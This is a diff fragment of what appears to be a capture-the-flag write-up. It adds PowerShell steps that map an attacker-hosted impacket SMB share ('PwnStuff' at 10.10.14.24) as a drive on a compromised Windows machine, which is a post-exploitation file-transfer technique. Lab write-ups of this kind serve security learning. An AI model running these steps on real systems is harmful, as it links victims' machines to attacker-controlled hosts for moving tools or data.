@@ -172,4 +172,8 @@ PS C:\Users\kohsuke\Desktop> whoami /priv
 ▶ impacket-smbserver PwnStuff `pwd`
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236417913-f7d190bb-1536-423b-9281-108512a2bc16.png)
-
+```CSS
+PS C:\Users\kohsuke\Documents> New-PsDrive -Name "HardyBoy" -PSProvider "FileSystem" -Root "\\10.10.14.24\PwnStuff"
+PS C:\Users\kohsuke\Documents> cd HardyBoy:
+```
+![image](https://user-images.githubusercontent.com/83878909/236418624-4a8aa8da-1174-4551-8c62-5a4ffb6dd317.png)
